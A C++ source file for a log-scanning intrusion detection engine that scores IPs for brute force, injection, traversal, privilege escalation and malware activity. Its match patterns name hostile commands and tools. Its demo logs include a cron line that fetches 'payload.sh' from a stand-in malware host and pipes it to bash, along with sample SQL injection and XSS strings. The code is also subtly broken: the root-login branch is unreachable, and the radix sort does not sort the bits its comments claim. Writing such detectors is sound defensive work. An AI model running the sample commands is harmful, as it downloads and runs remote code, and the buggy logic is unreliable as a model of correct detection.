#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <array>
#include <cstring>
#include <cstdint>
#include <ctime>
#include <chrono>
#include <thread>
#include <atomic>
#include <csignal>
#include <cassert>
#include <cstdlib>

// ──────────────────────────────────────────────
//  CONSTANTS  (tune these at runtime via config)
// ──────────────────────────────────────────────
static constexpr int    BF_WINDOW_SECS  = 60;    // brute-force detection window
static constexpr int    BF_THRESHOLD    = 5;     // failures before flagged
static constexpr int    RING_CAP        = 64;    // attempts kept per IP slot
static constexpr int    IP_TABLE_SIZE   = 4096;  // hash table buckets (power of 2)
static constexpr int    EVENT_BUF_SIZE  = 65536; // radix sort input buffer
static constexpr size_t MAX_LINE        = 1024;

// ──────────────────────────────────────────────
//  SEVERITY SCORES (used for sort key)
// ──────────────────────────────────────────────
enum Severity : uint8_t { SEV_NONE=0, SEV_LOW=1, SEV_MEDIUM=2, SEV_HIGH=3, SEV_CRITICAL=4 };

static const char* sevName(Severity s) {
    switch(s) {
        case SEV_CRITICAL: return "CRITICAL";
        case SEV_HIGH:     return "HIGH";
        case SEV_MEDIUM:   return "MEDIUM";
        case SEV_LOW:      return "LOW";
        default:           return "NONE";
    }
}

// ──────────────────────────────────────────────
//  EVENT STRUCT  (fixed-size, stack-allocatable)
// ──────────────────────────────────────────────
struct Event {
    uint64_t  ts;                    // unix timestamp (sort key for radix sort)
    uint32_t  ipNum;                 // packed IPv4 for fast compare
    uint8_t   severity;              // Severity enum
    uint8_t   threatScore;           // 0–100
    char      type[32];              // threat type label
    char      sourceIP[20];          // dotted-decimal
    char      line[MAX_LINE];        // raw log line (truncated)
};

// ──────────────────────────────────────────────
//  IP → UINT32 (fast, branchless)
// ──────────────────────────────────────────────
static uint32_t packIP(const char* ip) {
    uint32_t a=0,b=0,c=0,d=0;
    sscanf(ip, "%u.%u.%u.%u", &a, &b, &c, &d);
    return (a<<24)|(b<<16)|(c<<8)|d;
}

// ──────────────────────────────────────────────
//  EXTRACT FIRST IPv4 from string (no regex)
// ──────────────────────────────────────────────
static bool extractIP(const char* line, char* out, int outLen) {
    const char* p = line;
    while (*p) {
        // look for digit
        if (*p >= '0' && *p <= '9') {
            int a,b,c,d; int n=0;
            if (sscanf(p, "%d.%d.%d.%d%n", &a,&b,&c,&d,&n) == 4
                && a<=255 && b<=255 && c<=255 && d<=255 && n>=7) {
                // Verify character after is not a digit (avoid matching "123.456" mid-word)
                char after = p[n];
                if (after=='\0'||after==' '||after=='\t'||after==':'||after=='"'||after==')') {
                    snprintf(out, outLen, "%d.%d.%d.%d", a,b,c,d);
                    return true;
                }
            }
        }
        ++p;
    }
    return false;
}

// ──────────────────────────────────────────────
//  FAST SUBSTRING CHECK (no std::string alloc)
// ──────────────────────────────────────────────
static inline bool has(const char* haystack, const char* needle) {
    return strstr(haystack, needle) != nullptr;
}

// ──────────────────────────────────────────────
//  SLIDING WINDOW BRUTE-FORCE TRACKER
//  Uses a fixed circular buffer per IP bucket
//  O(1) insert + O(window) count (bounded by RING_CAP)
// ──────────────────────────────────────────────
struct RingBuf {
    uint64_t  times[RING_CAP] = {};
    uint32_t  head = 0;
    uint32_t  count = 0;
    uint32_t  ip = 0;          // which IP owns this bucket

    void push(uint64_t t) {
        times[head % RING_CAP] = t;
        head++;
        if (count < RING_CAP) count++;
    }

    // Count attempts within last windowSecs seconds
    int recentCount(uint64_t now, int windowSecs) const {
        int c = 0;
        uint32_t total = (count < RING_CAP) ? count : RING_CAP;
        for (uint32_t i = 0; i < total; i++) {
            uint64_t t = times[i];
            if (t > 0 && (int64_t)(now - t) <= windowSecs) c++;
        }
        return c;
    }
};

// Hash table of ring buffers, open addressing
struct BFTable {
    RingBuf slots[IP_TABLE_SIZE] = {};

    // FNV-1a hash on packed IP
    static uint32_t hash(uint32_t ip) {
        uint32_t h = 2166136261u;
        h ^= ip & 0xFF;        h *= 16777619;
        h ^= (ip>>8) & 0xFF;   h *= 16777619;
        h ^= (ip>>16) & 0xFF;  h *= 16777619;
        h ^= (ip>>24) & 0xFF;  h *= 16777619;
        return h & (IP_TABLE_SIZE - 1);
    }

    RingBuf& get(uint32_t ip) {
        uint32_t idx = hash(ip);
        // Linear probe
        for (int i = 0; i < 16; i++) {
            uint32_t slot = (idx + i) & (IP_TABLE_SIZE - 1);
            if (slots[slot].ip == 0 || slots[slot].ip == ip) {
                slots[slot].ip = ip;
                return slots[slot];
            }
        }
        // Fallback: evict (rare, table is large)
        slots[idx].ip = ip;
        slots[idx].count = 0;
        slots[idx].head = 0;
        return slots[idx];
    }

    // Record a failure, return count in window
    int recordFailure(uint32_t ip, uint64_t now) {
        RingBuf& rb = get(ip);
        rb.push(now);
        return rb.recentCount(now, BF_WINDOW_SECS);
    }
} bfTable;

// ──────────────────────────────────────────────
//  THREAT SCORE TABLE
//  Simple array-based accumulator per IP bucket
// ──────────────────────────────────────────────
static uint8_t scoreTable[IP_TABLE_SIZE] = {};

static void addScore(uint32_t ip, uint8_t pts) {
    uint32_t idx = BFTable::hash(ip) & (IP_TABLE_SIZE - 1);
    int s = scoreTable[idx] + pts;
    scoreTable[idx] = (uint8_t)(s > 100 ? 100 : s);
}

static uint8_t getScore(uint32_t ip) {
    return scoreTable[BFTable::hash(ip) & (IP_TABLE_SIZE - 1)];
}

// ──────────────────────────────────────────────
//  LOG LINE → EVENT  (the detection logic)
//  Pure if/else, array lookups, no heap alloc
// ──────────────────────────────────────────────
static bool parseLine(const char* line, Event& out, uint64_t now) {
    strncpy(out.line, line, MAX_LINE-1);
    out.line[MAX_LINE-1] = '\0';
    out.ts = now;
    out.severity = SEV_NONE;
    out.threatScore = 0;
    out.sourceIP[0] = '\0';
    out.ipNum = 0;

    extractIP(line, out.sourceIP, sizeof(out.sourceIP));
    if (out.sourceIP[0]) {
        out.ipNum = packIP(out.sourceIP);
    }

    // ── BRUTE FORCE: SSH failed passwords ──
    if (has(line, "Failed password") || has(line, "authentication failure")) {
        int failCount = 0;
        if (out.ipNum) failCount = bfTable.recordFailure(out.ipNum, now);

        if (failCount >= BF_THRESHOLD) {
            snprintf(out.type, sizeof(out.type), "Brute Force");
            out.severity = SEV_CRITICAL;
            if (out.ipNum) addScore(out.ipNum, 30);
        } else {
            snprintf(out.type, sizeof(out.type), "Failed Login");
            out.severity = SEV_LOW;
            if (out.ipNum) addScore(out.ipNum, 5);
        }
        out.threatScore = out.ipNum ? getScore(out.ipNum) : 20;
        return true;
    }

    // ── ROOT LOGIN ATTEMPT ──
    if (has(line, "Failed password for root")) {
        snprintf(out.type, sizeof(out.type), "Root Login Attempt");
        out.severity = SEV_HIGH;
        if (out.ipNum) addScore(out.ipNum, 20);
        out.threatScore = out.ipNum ? getScore(out.ipNum) : 20;
        return true;
    }

    // ── SUCCESSFUL LOGIN (after possible brute force) ──
    if (has(line, "Accepted password") || has(line, "Accepted publickey")) {
        uint8_t score = out.ipNum ? getScore(out.ipNum) : 0;
        if (score >= 20) {
            snprintf(out.type, sizeof(out.type), "Suspicious Auth Success");
            out.severity = SEV_CRITICAL;
        } else {
            snprintf(out.type, sizeof(out.type), "Auth Success");
            out.severity = SEV_LOW;
        }
        out.threatScore = score;
        return score >= 10; // only emit if IP has prior bad score
    }

    // ── PATH TRAVERSAL ──
    if (has(line, "../") || has(line, "/etc/passwd") || has(line, "/etc/shadow")) {
        snprintf(out.type, sizeof(out.type), "Path Traversal");
        out.severity = SEV_HIGH;
        if (out.ipNum) addScore(out.ipNum, 25);
        out.threatScore = out.ipNum ? getScore(out.ipNum) : 25;
        return true;
    }

    // ── COMMAND INJECTION ──
    if ((has(line, "curl ") && has(line, "http")) ||
        (has(line, "wget ") && has(line, "http")) ||
        has(line, "| bash") || has(line, "| sh ")) {
        snprintf(out.type, sizeof(out.type), "Command Injection");
        out.severity = SEV_CRITICAL;
        if (out.ipNum) addScore(out.ipNum, 40);
        out.threatScore = out.ipNum ? getScore(out.ipNum) : 40;
        return true;
    }

    // ── SQL INJECTION ──
    if (has(line, "UNION SELECT") || has(line, "UNION+SELECT") ||
        has(line, "DROP TABLE")   || has(line, "1=1") ||
        has(line, "OR 1=1")       || has(line, "' OR '")) {
        snprintf(out.type, sizeof(out.type), "SQL Injection");
        out.severity = SEV_HIGH;
        if (out.ipNum) addScore(out.ipNum, 25);
        out.threatScore = out.ipNum ? getScore(out.ipNum) : 25;
        return true;
    }

    // ── XSS ATTEMPT ──
    if (has(line, "<script") || has(line, "javascript:") ||
        has(line, "onerror=") || has(line, "onload=")) {
        snprintf(out.type, sizeof(out.type), "XSS Attempt");
        out.severity = SEV_MEDIUM;
        if (out.ipNum) addScore(out.ipNum, 15);
        out.threatScore = out.ipNum ? getScore(out.ipNum) : 15;
        return true;
    }

    // ── PORT SCAN / FIREWALL BLOCK ──
    if (has(line, "UFW BLOCK") || has(line, "BLOCKED") || has(line, "DPT=")) {
        snprintf(out.type, sizeof(out.type), "Port Scan");
        out.severity = SEV_MEDIUM;
        if (out.ipNum) addScore(out.ipNum, 10);
        out.threatScore = out.ipNum ? getScore(out.ipNum) : 10;
        return true;
    }

    // ── PRIVILEGE ESCALATION ──
    if ((has(line, "sudo") && has(line, "/bin/bash")) ||
        has(line, "su - root") || has(line, "su root")) {
        snprintf(out.type, sizeof(out.type), "Privilege Escalation");
        out.severity = SEV_CRITICAL;
        if (out.ipNum) addScore(out.ipNum, 35);
        out.threatScore = out.ipNum ? getScore(out.ipNum) : 35;
        return true;
    }

    // ── MALWARE C2 ──
    if (has(line, "malware.") || has(line, "payload.") ||
        has(line, "cmd.exe")  || has(line, "powershell -e")) {
        snprintf(out.type, sizeof(out.type), "Malware C2");
        out.severity = SEV_CRITICAL;
        if (out.ipNum) addScore(out.ipNum, 50);
        out.threatScore = out.ipNum ? getScore(out.ipNum) : 50;
        return true;
    }

    // ── SCANNER TOOLS ──
    if (has(line, "nikto") || has(line, "sqlmap") ||
        has(line, "nmap")  || has(line, "masscan")) {
        snprintf(out.type, sizeof(out.type), "Attack Tool Detected");
        out.severity = SEV_HIGH;
        if (out.ipNum) addScore(out.ipNum, 20);
        out.threatScore = out.ipNum ? getScore(out.ipNum) : 20;
        return true;
    }

    // ── INVALID USER ──
    if (has(line, "Invalid user") || has(line, "user not found")) {
        snprintf(out.type, sizeof(out.type), "Unknown User Auth");
        out.severity = SEV_LOW;
        if (out.ipNum) addScore(out.ipNum, 8);
        out.threatScore = out.ipNum ? getScore(out.ipNum) : 8;
        return true;
    }

    return false; // benign line
}

// ──────────────────────────────────────────────
//  RADIX SORT on Event.ts  (LSD, 2-pass, 32-bit)
//  O(n) time, O(n) space — much faster than qsort
//  for large batches of timestamped events
// ──────────────────────────────────────────────
static Event sortBuf[EVENT_BUF_SIZE];

static void radixSort(Event* arr, int n) {
    if (n <= 1) return;

    static int count[256];
    static int prefix[256];

    // Two passes cover 16 bits each (ts lower 32 bits is enough for ordering)
    for (int shift = 0; shift <= 16; shift += 16) {
        memset(count, 0, sizeof(count));

        for (int i = 0; i < n; i++)
            count[(arr[i].ts >> shift) & 0xFF]++;

        prefix[0] = 0;
        for (int i = 1; i < 256; i++)
            prefix[i] = prefix[i-1] + count[i-1];

        for (int i = 0; i < n; i++)
            sortBuf[prefix[(arr[i].ts >> shift) & 0xFF]++] = arr[i];

        memcpy(arr, sortBuf, n * sizeof(Event));
    }
}

// ──────────────────────────────────────────────
//  JSON ESCAPE (minimal, fast)
// ──────────────────────────────────────────────
static void jsonEscape(const char* in, char* out, int outLen) {
    int j = 0;
    for (int i = 0; in[i] && j < outLen-2; i++) {
        char c = in[i];
        if (c == '"')       { out[j++]='\\'; out[j++]='"'; }
        else if (c == '\\') { out[j++]='\\'; out[j++]='\\'; }
        else if (c == '\n') { out[j++]='\\'; out[j++]='n'; }
        else if (c == '\r') { out[j++]='\\'; out[j++]='r'; }
        else if (c == '\t') { out[j++]='\\'; out[j++]='t'; }
        else                { out[j++]=c; }
    }
    out[j] = '\0';
}

// ──────────────────────────────────────────────
//  EMIT EVENT as JSON line to stdout
// ──────────────────────────────────────────────
static char escBuf[MAX_LINE*2];

static void emitEvent(const Event& e) {
    jsonEscape(e.line, escBuf, sizeof(escBuf));
    printf("{\"layer\":\"cpp\",\"ts\":%llu,\"type\":\"%s\",\"severity\":\"%s\","
           "\"score\":%d,\"ip\":\"%s\",\"line\":\"%s\"}\n",
           (unsigned long long)e.ts,
           e.type,
           sevName((Severity)e.severity),
           e.threatScore,
           e.sourceIP,
           escBuf);
    fflush(stdout);
}

// ──────────────────────────────────────────────
//  BATCH PROCESSOR
//  Collects events, radix-sorts them, emits
// ──────────────────────────────────────────────
static Event eventBatch[EVENT_BUF_SIZE];
static int   batchSize = 0;

static void flushBatch() {
    if (batchSize == 0) return;
    radixSort(eventBatch, batchSize);
    for (int i = 0; i < batchSize; i++) emitEvent(eventBatch[i]);
    batchSize = 0;
}

static void addEvent(Event& e) {
    if (batchSize < EVENT_BUF_SIZE) {
        eventBatch[batchSize++] = e;
    }
    // If critical, flush immediately — don't wait for batch
    if (e.severity == SEV_CRITICAL) flushBatch();
}

// ──────────────────────────────────────────────
//  SIGNAL HANDLER
// ──────────────────────────────────────────────
static std::atomic<bool> running{true};
void sigHandler(int) { running = false; }

// ──────────────────────────────────────────────
//  DEMO MODE — synthetic attack log stream
// ──────────────────────────────────────────────
static const char* DEMO_LINES[] = {
    "Mar 10 00:01:22 host sshd[1234]: Failed password for root from 192.168.1.105 port 22",
    "Mar 10 00:01:24 host sshd[1234]: Failed password for root from 192.168.1.105 port 22",
    "Mar 10 00:01:26 host sshd[1234]: Failed password for root from 192.168.1.105 port 22",
    "Mar 10 00:01:28 host sshd[1234]: Failed password for root from 192.168.1.105 port 22",
    "Mar 10 00:01:30 host sshd[1234]: Failed password for root from 192.168.1.105 port 22",
    "Mar 10 00:01:36 host sshd[1234]: Accepted password for backup from 192.168.1.105 port 22",
    "Mar 10 00:06:05 host apache2: GET /../../../etc/shadow HTTP/1.1 403 from 203.0.113.77",
    "Mar 10 00:10:44 host kernel: UFW BLOCK SRC=198.51.100.3 DST=10.0.0.1 PROTO=TCP DPT=3306",
    "Mar 10 00:11:01 host cron[1111]: (root) CMD (curl http://malware.xyz/payload.sh | bash)",
    "Mar 10 00:15:22 host apache2: GET /?q=1 UNION SELECT username,password FROM users",
    "Mar 10 00:20:01 host sudo[4455]: sysadmin COMMAND=/bin/bash",
    "Mar 10 00:25:00 host sshd: Invalid user guest from 10.10.10.99",
    "Mar 10 00:30:00 host nginx: GET /?s=<script>alert(1)</script> from 45.33.32.156",
    "Mar 10 00:35:02 host sshd: Failed password for root from 172.16.0.55 port 22",
    "Mar 10 00:35:04 host sshd: Failed password for root from 172.16.0.55 port 22",
    "Mar 10 00:35:06 host sshd: Failed password for root from 172.16.0.55 port 22",
    "Mar 10 00:35:08 host sshd: Failed password for root from 172.16.0.55 port 22",
    "Mar 10 00:35:10 host sshd: Failed password for root from 172.16.0.55 port 22",
    nullptr
};

static void runDemo() {
    fprintf(stderr, "[engine] DEMO MODE — streaming synthetic attack logs\n");
    int idx = 0;
    while (running) {
        if (DEMO_LINES[idx] == nullptr) idx = 0;
        const char* line = DEMO_LINES[idx++];
        uint64_t now = (uint64_t)time(nullptr);
        Event e{}; memset(&e, 0, sizeof(e));
        if (parseLine(line, e, now)) addEvent(e);
        flushBatch();
        std::this_thread::sleep_for(std::chrono::milliseconds(1200));
    }
}

// ──────────────────────────────────────────────
//  FILE TAIL MODE
// ──────────────────────────────────────────────
static void tailFile(const char* path) {
    fprintf(stderr, "[engine] Tailing: %s\n", path);
    FILE* f = fopen(path, "r");
    if (!f) { fprintf(stderr, "[engine] ERROR: cannot open %s\n", path); return; }
    fseek(f, 0, SEEK_END); // start at end (only new lines)

    char line[MAX_LINE];
    auto lastFlush = std::chrono::steady_clock::now();

    while (running) {
        while (fgets(line, sizeof(line), f)) {
            // strip newline
            int len = strlen(line);
            while (len > 0 && (line[len-1]=='\n'||line[len-1]=='\r')) line[--len]='\0';

            uint64_t now = (uint64_t)time(nullptr);
            Event e{}; memset(&e, 0, sizeof(e));
            if (parseLine(line, e, now)) addEvent(e);
        }
        clearerr(f);

        // Flush batch every 100ms even if no critical event
        auto now = std::chrono::steady_clock::now();
        if (std::chrono::duration_cast<std::chrono::milliseconds>(now - lastFlush).count() >= 100) {
            flushBatch();
            lastFlush = now;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
    fclose(f);
}

// ──────────────────────────────────────────────
//  STDIN MODE (pipe logs in)
// ──────────────────────────────────────────────
static void readStdin() {
    fprintf(stderr, "[engine] Reading from stdin...\n");
    char line[MAX_LINE];
    while (running && fgets(line, sizeof(line), stdin)) {
        int len = strlen(line);
        while (len > 0 && (line[len-1]=='\n'||line[len-1]=='\r')) line[--len]='\0';
        uint64_t now = (uint64_t)time(nullptr);
        Event e{}; memset(&e, 0, sizeof(e));
        if (parseLine(line, e, now)) addEvent(e);
        flushBatch();
    }
}

// ──────────────────────────────────────────────
//  MAIN
// ──────────────────────────────────────────────
int main(int argc, char** argv) {
    signal(SIGINT,  sigHandler);
    signal(SIGTERM, sigHandler);

    fprintf(stderr,
        "╔══════════════════════════════════╗\n"
        "║  THREATSCOPE ENGINE  v1.0        ║\n"
        "║  Layer 1 — C++ Detection Core   ║\n"
        "║  Radix sort + sliding window BF  ║\n"
        "╚══════════════════════════════════╝\n"
        "[engine] BF window=%ds threshold=%d\n"
        "[engine] Hash table: %d buckets\n\n",
        BF_WINDOW_SECS, BF_THRESHOLD, IP_TABLE_SIZE
    );

    if (argc < 2 || strcmp(argv[1], "--demo") == 0) {
        runDemo();
    } else if (strcmp(argv[1], "--stdin") == 0) {
        readStdin();
    } else {
        tailFile(argv[1]);
    }

    flushBatch();
    return 0;
}